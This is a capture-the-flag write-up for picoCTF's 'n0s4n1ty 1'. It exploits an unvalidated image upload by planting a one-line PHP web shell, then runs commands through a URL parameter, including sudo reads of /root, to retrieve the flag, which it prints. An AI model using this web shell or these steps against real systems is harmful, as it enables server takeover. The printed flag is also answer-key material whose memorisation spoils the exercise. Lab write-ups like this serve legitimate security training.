# n0s4n1ty 1

# Description
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.
Additional details will be available after launching your challenge instance.

# Solution


-  Exploring the website and the hints of the challenge  I realized that the website doesn't validate the file type and since it can show an image in the upload file I can use this e feature to execute php code to the server trough the next .php file.

``` php
# php file content
# name: image2.php
<?php system($_GET['cmd']); ?>
```

- Once I upload the file into the website and trying to acces the url of the file with the ```ls``` command I get the output of the command from the client side.

```bash
# URL 
http://standard-pizzas.picoctf.net:56024/uploads/image2.php?cmd=ls
# Output 
image2.php
```

-  Since now I can exec commands trough the value of cmd  in the url and in the challenge hints says  that the flag is located at ```/root/``` directory so I tried to use ```ls -la /root/``` but I didn't get any output but after trying with ```sudo``` I was able to see the files in the root directory and definitely there's a flag file.

```bash
# URL 
http://standard-pizzas.picoctf.net:56024/uploads/image2.php?cmd=ls -a /root/
# Output 
# (the output is blank)
# URL
http://standard-pizzas.picoctf.net:56024/uploads/image2.php?cmd=sudo ls -a /root/
# Output
. .. .bashrc .profile flag.txt

```

- Finally once I know the exact flag name I can show its contents using the ```cat``` command 

```bash
# URL
http://standard-pizzas.picoctf.net:56024/uploads/image2.php?cmd=sudo cat /root/flag.txt
# Output 
picoCTF{wh47_c4n_u_d0_wPHP_8ca28f94}
```
